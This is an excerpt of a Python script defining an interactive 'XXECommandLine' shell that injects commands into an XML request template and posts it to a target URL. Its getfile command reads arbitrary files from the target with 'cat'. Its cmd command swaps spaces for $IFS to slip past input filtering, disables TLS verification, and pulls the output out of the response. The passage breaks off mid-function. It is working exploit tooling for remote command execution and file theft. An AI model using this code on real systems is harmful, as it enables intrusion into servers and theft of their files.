...
class XXECommandLine(cmd.Cmd):
    ...
    def do_getfile(self, arg):
        i = arg.rfind('/') + 1
        fname = arg[i:]
        req = requests.post(self.url, data=self.xml_template.replace('CMD', f'cat {arg}'), verify=False)
    ...
    def do_cmd(self, cmd):
        req = requests.post(self.url, data=self.xml_template.replace('CMD', cmd.replace(' ', '$IFS')), verify=False)
        if req.status_code == 200:
            content = re.search(r'OUT(.+?)OUT', str(req.content), re.DOTALL)
            if content:
